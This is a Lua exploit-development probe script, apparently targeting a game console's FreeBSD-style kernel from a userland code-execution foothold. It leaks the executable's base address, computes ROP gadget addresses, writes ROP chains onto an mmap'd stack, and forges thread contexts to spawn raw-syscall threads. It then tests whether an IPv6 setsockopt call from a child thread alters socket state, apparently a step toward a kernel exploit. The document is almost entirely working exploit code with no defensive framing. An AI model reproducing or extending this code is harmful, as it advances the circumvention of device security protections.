-- CRASH_CLASS: LOW
-- PROBE 91t: mmap context + nanosleep-only child
--
-- Isolates: does mmap'd thr_create work cleanly with no setsockopt?
-- Test A: child nanosleep only (should be completely clean)
-- Test B: child setsockopt(getpid) then nanosleep (1-arg safe syscall)
-- Test C: child setsockopt with R10=0x090 then nanosleep (the real test)
-- Each test prints markers before and after thr_create.

print("=== PROBE 91t: MMAP+NANOSLEEP ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local tk=mk(433)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))

local _DI=0x048;local _SI=0x050;local _DX=0x058;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

-- ============================================================
-- TEST A: mmap ctx, child nanosleep only
-- ============================================================
print("--- A: MMAP CTX + NANOSLEEP ---")
print("A: before mmap")
do
    local ok1,rgn=pcall(function()
        return mm(uint64(0),uint64(3*0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok1 then print("A: MMAP FAIL") return end
    local base=N(rgn)
    print("A: base="..string.format("0x%X",base))

    -- Layout: page0=data, page1=stack, page2=context
    local ts=base          -- 16 bytes nanosleep timespec
    local sl=base+0x20     -- 16 bytes short sleep
    local stk=base+0x4000  -- stack page
    local ctx=base+0x8000  -- context page

    wq(ts,uint64(999)); wq(ts+8,uint64(0))
    wq(sl,uint64(0)); wq(sl+8,uint64(50000000))

    -- ROP padding on stack (repeated nanosleep)
    local sp=stk
    for i=1,10 do
        wq(sp,PRSI); sp=sp+8
        wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRDI); sp=sp+8
        wq(sp,uint64(ts)); sp=sp+8
        wq(sp,PRAX); sp=sp+8
        wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end

    -- Context: nanosleep(ts, NULL)
    print("A: building ctx")
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(240))    -- nanosleep
    wq(ctx+_DI,uint64(ts))     -- rqtp
    wq(ctx+_SI,uint64(0))      -- rmtp = NULL

    print("A: spawning")
    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)
    print("A: spawned tid="..tostring(tid and N(tid) or "nil"))

    -- Wait 50ms
    native.fcall_with_rax(stub,240,sl,0)

    local a=false
    if tid and N(tid)>0 then
        local kr=N(native.fcall_with_rax(stub,433,N(tid),0))
        a=(kr==0)
    end
    print("A: alive="..tostring(a))

    -- Kill child
    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
    print("A: PASS")
end

-- ============================================================
-- TEST B: mmap ctx, child getpid (1 arg) then nanosleep
-- ============================================================
print("")
print("--- B: MMAP CTX + GETPID ---")
do
    local ok1,rgn=pcall(function()
        return mm(uint64(0),uint64(3*0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok1 then print("B: MMAP FAIL") return end
    local base=N(rgn)

    local ts=base; local sl=base+0x20
    local stk=base+0x4000; local ctx=base+0x8000
    wq(ts,uint64(999)); wq(ts+8,uint64(0))
    wq(sl,uint64(0)); wq(sl+8,uint64(50000000))

    local sp=stk
    for i=1,5 do
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRDI); sp=sp+8; wq(sp,uint64(ts)); sp=sp+8
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end

    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(20))     -- getpid

    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    native.fcall_with_rax(stub,240,sl,0)
    local a=false
    if tid and N(tid)>0 then
        local kr=N(native.fcall_with_rax(stub,433,N(tid),0))
        a=(kr==0)
    end
    print("B: tid="..tostring(tid and N(tid) or "nil").." alive="..tostring(a))

    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
end

-- ============================================================
-- TEST C: mmap ctx, child setsockopt(hops) then nanosleep
-- ============================================================
print("")
print("--- C: SETSOCKOPT HOPS ---")
do
    local s6=N(native.fcall_with_rax(stub,97,28,2,0))
    print("C: s6="..s6)
    if s6<=0 then print("C: NO IPv6") return end

    -- Set hops=42
    local hb=memory.alloc(4); wd(hb,42)
    native.fcall_with_rax(stub,105,s6,41,4,N(hb),4)

    local ok1,rgn=pcall(function()
        return mm(uint64(0),uint64(3*0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok1 then print("C: MMAP FAIL") return end
    local base=N(rgn)

    local ts=base; local sl=base+0x20; local optval=base+0x40
    local stk=base+0x4000; local ctx=base+0x8000
    wq(ts,uint64(999)); wq(ts+8,uint64(0))
    wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
    wd(optval,77)

    local sp=stk
    for i=1,5 do
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRDI); sp=sp+8; wq(sp,uint64(ts)); sp=sp+8
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end

    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(s6))
    wq(ctx+_SI,uint64(41))
    wq(ctx+_DX,uint64(4))
    wq(ctx+0x090,uint64(optval))  -- R10 candidate
    wq(ctx+0x068,uint64(4))       -- R8 candidate

    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    native.fcall_with_rax(stub,240,sl,0)

    -- Check hops
    local gb=memory.alloc(8); wd(gb,0); wd(gb+4,0)
    local gl=memory.alloc(4); wd(gl,4)
    native.fcall_with_rax(stub,118,s6,41,4,N(gb),N(gl))
    local hops=rd(gb)

    local a=false
    if tid and N(tid)>0 then
        local kr=N(native.fcall_with_rax(stub,433,N(tid),0))
        a=(kr==0)
    end
    print("C: hops="..tostring(hops).." alive="..tostring(a))
    if hops==77 then print("C: *** HOPS CHANGED ***") end

    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
    native.fcall_with_rax(stub,6,s6)
end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91t DONE ===")
